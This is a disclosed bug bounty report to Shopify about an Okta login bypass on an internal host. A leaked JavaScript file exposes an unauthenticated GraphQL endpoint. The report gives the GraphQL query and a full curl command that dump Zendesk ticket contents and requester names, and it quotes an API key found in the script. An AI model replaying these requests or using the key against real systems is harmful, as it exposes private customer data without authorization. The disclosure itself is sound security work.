# Unauthenticated access to Zendesk tickets through athena-flex-production.shopifycloud.com Okta bypass

## Report Details
- **Report ID**: 397130
- **URL**: https://hackerone.com/reports/397130
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-08-20T00:14:05.542Z
- **Disclosed**: 2018-09-19T16:15:49.202Z

## Reporter
- **Username**: rijalrojan
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
**Summary**

athena-flex-production.shopifycloud.com seems to be an internal system that Shopify uses because it redirects user to Okta login. During this however, I noticed that it first returns 200 and then does a redirect meaning some part of the website loads before redirecting. With this, I was able to get the JS being used in the system. Through the JS file, I found a path that allows GraphQL queries thus resulting in a full dump of Zendesk ticket information. 

**Description**

When you originally go to athena-flex-production.shopifycloud.com you will find that it will redirect to Okta. However if you do `view-source:athena-flex-production.shopifycloud.com` in Chrome, it will show that the website loads momentarily. In one of the script src, there is this link requested by the website: 

https://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js

When you beautify the JS file you will notice it has some query data that can be used at the /graphql endpoint. After I got this, I started to play around with the GraphQL schema and see what I could gain access to. 

For my test I sent: 

```
{"query": "query getRecentTicketsQuery($domain: String) {\n    shop(myshopifyDomain: $domain) {\n      zendesk {\n        tickets(last: 5) {\n          edges {\n            node {\n              id\n               requester {\n                name\n              }\n              subject\n              description\n              }\n          }\n        }\n      }\n    }\n  }\n","variables":{"domain":"ok.myshopify.com"}}
```

What this query says is: Return last 5 tickets with description, reporter name and subject of the ticket that contain domain ok.myshopify.com. Once the query was done, it responded with 9,259 bytes of JSON response that contained extremely critical data. 

I don't want to paste the data here for obvious reason but I am attacking the file here so you can delete it by contact support@hackerone.com later if you wish to disclose the report. 


**Reproduction**
1. Send the following curl request: 

```
curl -i -s -k  -X $'POST' \
    -H $'Host: athena-flex-production.shopifycloud.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Length: 422' \
    --data-binary $'{\"query\": \"query getRecentTicketsQuery($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      zendesk {\\n        tickets(last: 5) {\\n          edges {\\n            node {\\n              id\\n               requester {\\n                name\\n              }\\n              subject\\n              description\\n              }\\n          }\\n        }\\n      }\\n    }\\n  }\\n\",\"variables\":{\"domain\":\"ok.myshopify.com\"}}' \
    $'https://athena-flex-production.shopifycloud.com/graphql'
```

**More information**

There is also an API key that I found on the JS file. I think this might be the Zendesk api key but I am not yet sure: 

```
R = n.n(O)()({
 apiKey: "5c0246635b3c77189888c0b10d3427ac",
 notifyReleaseStages: ["production"],
 releaseStage: "production" 
}),
```

## Impact

1. Get ticket description means dumping any detail you want. 
2. Creating zendesk ticket in behalf of other agents. 
3. Changing state of other tickets. 

**I will post list of all functions that is possible in this graphql.**

## Attachments
No attachments
